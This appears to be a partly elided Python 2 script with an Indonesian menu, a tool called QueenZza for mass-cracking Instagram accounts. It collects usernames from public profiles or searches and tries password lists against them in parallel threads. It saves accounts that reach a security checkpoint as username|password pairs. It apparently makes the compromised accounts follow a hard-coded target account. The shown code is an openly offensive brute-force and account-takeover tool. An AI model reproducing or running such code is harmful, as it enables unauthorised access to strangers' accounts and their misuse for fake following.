...
def cek_login():
	...
	try:
		...
		url = "https://i.instagram.com/api/v1/friendships/32799336056/followers/?count=5"
...
\x1b[1;91m
  ...
  | | | || | | |  _| |  _| |  \| | / /  / /  / _ \  
  | |_| || |_| | |___| |___| |\  |/ /_ / /_ / ___ \ 
   \__\_\.\___/|_____|_____|_| \_/____/____/_/   \_\ """%(N))

### MENU ###
def menu_dev():
	logo()
	print(" [*] Script      : QueenZza ")
	print(" [*] Bergabung   : %s"%(tgl))
	print(" [*] ---------------------------------------------")
	print(" [*] Status      : %sFREE%s"% (H,N))
	print(" [*] Kadaluwarsa : No Limit")
	print(" [*] ---------------------------------------------")
	print(" [*] IP          : %s\n"%(IP))
	print(" [ selamat datang %sBaby Comel%s ]\n"%(K,N))
	print(" [01]. Mulung dari akun publik")
	print(" [02]. Mulung dari pencarian")
	print(" [03]. cek akun hasil Mulung")
	...
	if pil == "1" or pil == "01":
		...
		us = usr_.replace(" ", "")
		pencarian_.append("babyghezaqolby")
		data_.append(us+"==>"+us)
		...
		if cek =="":
			...
			dirs = os.listdir("Check")
			print(" [*] list nama file tersimpan di folder Check\n")
			for file in dirs:
				print(" [+] "+file)
			try:
				file = raw_input("\n [?] pilih nama file : ")
				if file == "":
					menu_dev()
				totalcp = open("Check/%s"%(file)).read().splitlines()
			except IOError:
				exit(" [!] file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
		...
		print" [!] isi pilihan dengan benar!"
	...
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				...
				insta_dev.submit(Mulung_dev, dat_, pw)
			except:
				pass
...
### Mulung ###
count_= 1
def Mulung_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	...
	for pass_satu in pass_dev_:
		if c != 1:
			...
			if len(status_foll) != 1:
				print("\r {}[*] [Mulung] {}/{} OK-:{} - CP-:{}".format(N,str(count_),len(data_),len(hasil_ok), len(hasil_cp))),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		...
		try:
			...
			with requests.Session() as ses_dev:
				...
				if "checkpoint_url" in str(data_dev):
					...
					open("Check/%s.txt"%(tanggal),"a").write(" [Check] %s|%s\n"%(username_dev, pass_dev))
					...
					Mulung_dev(username_dev, pass_dev_iq)
					count_ -= 1
				else:
					c = 1
					pass
...
def follow_dev(ses_dev, username_dev):
	...
	if len(status_foll) != 1:
		user_target = "babyghezaqolby"
		id_target = "32799336056"
	else:
		...
		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
			for data_cek in data_cp:
				try:
					...
					insta_cek_dev.submit(Mulung_dev, user_cp, pw_cp_)
				except:
					pass
